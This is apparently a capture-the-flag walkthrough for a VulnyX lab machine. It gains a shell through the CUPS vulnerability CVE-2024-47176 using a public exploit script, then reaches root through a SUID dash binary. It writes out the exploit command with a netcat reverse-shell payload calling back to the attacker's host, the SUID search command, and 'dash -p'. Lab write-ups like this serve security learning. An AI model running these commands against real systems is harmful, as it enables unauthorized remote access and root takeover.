# URL
https://vulnyx.com/#fuser
# Concept
* CUPS hacking (vulnerable version) (2.3.3.op2)
* SUID dash
# Method of solve
## Starting Scans
* from the starting scans, we see there is ports `22`, `80`, and `631` available
* there's nothing on port 80
* port 631 is CUPS, which is a printer service
* the version being used is displayed, `2.3.3op2`
* when we search for a potential exploit, we search by the CVE number associated with this: `CVE-2024-47176 github rce`
## Initial Access
* we find this script that we use to attack the service:
```
https://github.com/0xCZR1/PoC-Cups-RCE-CVE-exploit-chain
```
* we use this syntax to run the exploit:
```
python evilcups.py 192.168.212.10 192.168.212.35 'nc 192.168.212.10 53 -e /bin/sh'
```
* we have to access the printer console on the server:
* `http://192.168.212.35:631/printers/`
* from here we can select our hacker server
* then from the drop-down menu, select `Maintenance`, then `Print Test Page`
* the payload command should execute
## Privilege Escalation
* there's an SUID binary that's unusual on this system:
```
find / -perm -4000 2>/dev/null
```
* the `dash` shell command is SUID, which means we can use it to become root
* the details for this can be found on this GTFObins page:
```
https://gtfobins.org/gtfobins/dash/#shell
```
* so the last we need to do to get the root access is this:
```
dash -p
```
* we are root!
